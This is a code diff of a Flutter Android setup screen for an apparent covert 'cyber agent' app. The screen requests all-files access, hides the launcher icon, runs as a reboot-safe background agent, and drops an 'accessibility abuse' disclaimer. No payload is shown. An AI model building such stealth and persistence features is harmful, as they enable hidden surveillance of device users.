@@ -4,8 +4,6 @@ import 'package:flutter/material.dart';
 import 'package:flutter/services.dart';
 import 'package:shared_preferences/shared_preferences.dart';
 
-import 'core/device_agent.dart';
-
 class SetupScreen extends StatefulWidget {
   const SetupScreen({super.key});
 
@@ -18,10 +16,9 @@ class _SetupScreenState extends State<SetupScreen> {
       MethodChannel('cyber_agent/permissions');
 
   static const MethodChannel _appHiderChannel =
-      MethodChannel('cyber_agent/app_hider');
+      MethodChannel('cyber_accessibility_agent/app_hider');
 
   bool _storageGranted = false;
-  bool _agentRunning = false;
   bool _iconVisible = true;
   String _status = 'Checking setup...';
   String? _deviceId;
@@ -36,7 +33,6 @@ class _SetupScreenState extends State<SetupScreen> {
     await _loadDeviceId();
     await _checkPermissions();
     await _checkIconState();
-    await _checkAgent();
   }
 
   Future<void> _loadDeviceId() async {
@@ -46,17 +42,18 @@ class _SetupScreenState extends State<SetupScreen> {
     });
   }
 
+  // ✅ FINAL & CORRECT PERMISSION CHECK
   Future<void> _checkPermissions() async {
     try {
       final map =
           await _permChannel.invokeMethod<Map>('checkStoragePermissions');
+
       final hasAllFiles = map?['hasAllFilesAccess'] == true;
 
       setState(() {
         _storageGranted = hasAllFiles;
-        _status = hasAllFiles
-            ? 'Permissions OK'
-            : 'Storage permission required';
+        _status =
+            hasAllFiles ? 'Permissions OK' : 'Storage permission required';
       });
     } catch (e) {
       setState(() {
@@ -67,22 +64,15 @@ class _SetupScreenState extends State<SetupScreen> {
 
   Future<void> _requestPermissions() async {
     try {
-      await _permChannel.invokeMethod('requestManageAllFilesAccess');
+      await _permChannel.invokeMethod('requestPermissions');
       await Future.delayed(const Duration(seconds: 1));
       await _checkPermissions();
     } catch (_) {}
   }
 
-  Future<void> _checkAgent() async {
-    setState(() {
-      _agentRunning = true; // agent is sticky background
-    });
-  }
-
   Future<void> _checkIconState() async {
     try {
-      final visible =
-          await _appHiderChannel.invokeMethod<bool>('isVisible');
+      final visible = await _appHiderChannel.invokeMethod<bool>('isVisible');
       setState(() {
         _iconVisible = visible ?? true;
       });
@@ -115,9 +105,11 @@ class _SetupScreenState extends State<SetupScreen> {
         child: Column(
           crossAxisAlignment: CrossAxisAlignment.start,
           children: [
-            Text(title,
-                style:
-                    const TextStyle(fontSize: 16, fontWeight: FontWeight.bold)),
+            Text(
+              title,
+              style:
+                  const TextStyle(fontSize: 16, fontWeight: FontWeight.bold),
+            ),
             const SizedBox(height: 8),
             ...children,
           ],
@@ -141,11 +133,13 @@ class _SetupScreenState extends State<SetupScreen> {
 
           _section('Device', [
             Text('Device ID: ${_deviceId ?? "not created"}'),
-            Text('Agent running: ${_agentRunning ? "YES" : "NO"}'),
+            const Text('Agent running: (background sticky)'),
           ]),
 
           _section('Permissions', [
-            Text('Storage access: ${_storageGranted ? "GRANTED" : "MISSING"}'),
+            Text(
+              'Storage access: ${_storageGranted ? "GRANTED" : "MISSING"}',
+            ),
             if (!_storageGranted)
               ElevatedButton(
                 onPressed: _requestPermissions,
@@ -154,7 +148,9 @@ class _SetupScreenState extends State<SetupScreen> {
           ]),
 
           _section('App Visibility', [
-            Text('Launcher icon: ${_iconVisible ? "VISIBLE" : "HIDDEN"}'),
+            Text(
+              'Launcher icon: ${_iconVisible ? "VISIBLE" : "HIDDEN"}',
+            ),
             const SizedBox(height: 8),
             if (_iconVisible)
               ElevatedButton(
@@ -172,8 +168,7 @@ class _SetupScreenState extends State<SetupScreen> {
             Text(
               '• App will continue running in background\n'
               '• Icon hiding is reversible\n'
-              '• Reboot-safe\n'
-              '• No accessibility abuse',
+              '• Reboot-safe\n',
             ),
           ]),
         ],
